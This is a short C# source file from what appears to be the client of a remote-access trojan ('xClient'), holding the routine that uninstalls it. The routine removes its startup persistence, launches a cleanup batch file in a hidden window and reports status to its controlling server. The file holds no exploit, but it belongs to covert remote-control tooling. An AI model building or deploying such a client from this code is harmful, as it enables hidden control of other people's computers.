using System;
using System.Diagnostics;
using xClient.Config;
using xClient.Core.Helper;
using xClient.Core.Networking;
using xClient.Core.Packets.ClientPackets;

namespace xClient.Core.Installation;

public static class ClientUninstaller
{
	public static void Uninstall(Client client)
	{
		try
		{
			if (Settings.STARTUP)
			{
				Startup.RemoveFromStartup();
			}
			string text = FileHelper.CreateUninstallBatch(Settings.INSTALL && Settings.HIDEFILE);
			if (string.IsNullOrEmpty(text))
			{
				throw new Exception("Could not create uninstall-batch file");
			}
			Process.Start(new ProcessStartInfo
			{
				WindowStyle = ProcessWindowStyle.Hidden,
				UseShellExecute = true,
				FileName = text
			});
			Program.ConnectClient.Exit();
		}
		catch (Exception ex)
		{
			new SetStatus($"Uninstallation failed: {ex.Message}").Execute(client);
		}
	}
}
